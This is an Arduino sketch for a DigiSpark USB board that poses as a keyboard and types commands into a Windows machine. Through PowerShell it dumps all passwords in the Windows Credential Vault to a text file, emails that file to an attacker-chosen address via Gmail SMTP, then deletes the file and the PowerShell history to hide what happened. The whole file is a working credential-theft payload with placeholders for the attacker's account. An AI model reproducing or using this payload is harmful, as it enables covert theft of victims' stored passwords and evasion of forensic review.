#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 // Enter Key

void setup() {
    pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } | Out-File -FilePath C:\\temp.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL@gmail.com', 'YOUR_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUR_EMAIL@gmail.com'; $ReportEmail.To.Add('SEND_EMAIL_TO'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report.'; $ReportEmail.Attachments.Add('C:\\temp.txt'); $SMTPInfo.Send($ReportEmail)");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("rm C:\\temp.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("Remove-Item (Get-PSreadlineOption).HistorySavePath");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, HIGH); //turn on led when finished
    DigiKeyboard.delay(90000);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(5000);
    for(;;){ /*empty*/ }
}
